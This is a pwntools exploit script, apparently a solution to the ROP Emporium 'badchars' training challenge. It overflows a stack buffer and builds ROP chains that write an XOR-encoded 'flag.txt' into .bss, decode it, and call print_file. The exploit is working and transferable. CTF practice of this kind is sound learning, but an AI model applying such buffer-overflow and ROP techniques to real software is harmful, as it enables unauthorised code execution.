import pwn

pwn.context(arch='amd64', os='linux', log_level='debug')

p = pwn.process('./badchars')
e = pwn.ELF('./badchars')
libbadchars = pwn.ELF('./libbadchars.so')

'''
for k, v in e.sym.items():
    print(k, hex(v))
print(hex(e.bss()))     # bss_addr = 0x601038
pwn.pause()
'''

main_addr = pwn.p64(e.sym['main'])
print_file_addr = pwn.p64(e.plt['print_file'])
bss_addr = e.bss()

xor_r14__r15__addr = pwn.p64(0x400628)   # xor r14, (%r15) ; ret
pop_r14_r15_addr = pwn.p64(0x4006a0)     # pop r14 ; pop r15 ; ret
pop_rdi_addr = pwn.p64(0x4006a3)         # pop rdi ; ret

#pwn.gdb.attach(p)

i = 0
for ch in 'flag.txt':
    payload = b'A' * 0x20 + b'B' * 8 + pop_r14_r15_addr + pwn.p64(ord(ch) ^ 2) + pwn.p64(bss_addr + i) + xor_r14__r15__addr + main_addr
    p.sendlineafter(b'> ', payload)
    i += 1

#pwn.gdb.attach(p)

for i in range(8):
    payload = b'A' * 0x20 + b'B' * 8 + pop_r14_r15_addr + pwn.p64(2) + pwn.p64(bss_addr + i) + xor_r14__r15__addr + main_addr
    p.sendlineafter(b'> ', payload)

payload = b'A' * 0x20 + b'B' * 8 + pop_rdi_addr + pwn.p64(bss_addr) + print_file_addr

#pwn.gdb.attach(p)

p.sendlineafter(b'> ', payload)

p.recv()
